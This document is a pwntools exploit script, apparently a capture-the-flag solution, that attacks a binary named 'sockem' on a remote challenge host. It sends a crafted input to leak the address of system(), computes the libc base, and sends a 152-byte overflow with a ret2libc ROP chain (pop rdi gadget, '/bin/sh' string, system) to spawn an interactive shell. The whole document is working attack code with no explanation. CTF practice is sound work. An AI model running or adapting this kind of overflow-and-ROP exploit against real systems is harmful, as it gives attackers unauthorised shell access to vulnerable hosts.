from pwn import *

# 0x00000000004008a3 : pop rdi ; ret
# 0x00000000004005b6 : ret
# 0x1b45bd - /bin/sh

elf = context.binary = ELF("./sockem")
libc = elf.libc

# p = elf.process()
# gs = '''b *main'''
# p = gdb.debug(elf.path,gs)

p = remote("host3.metaproblems.com" ,4145)

leak = b"A"*10 + p64(0xcafebabe)

p.recvuntil(": ")
p.sendline(leak)

p.recvline()
p.recvuntil(": ")

system = int(p.recvline().strip(),16)
libc_base = system - 0x52290

print(hex(system))
print(hex(libc_base))

payload = b"A"*152
payload += p64(0x00000000004008a3)
payload  += p64(libc_base + 0x1b45bd)
payload += p64(0x00000000004005b6)
payload += p64(system)

print(p.recvuntil(": "))

p.sendline(payload)

p.interactive()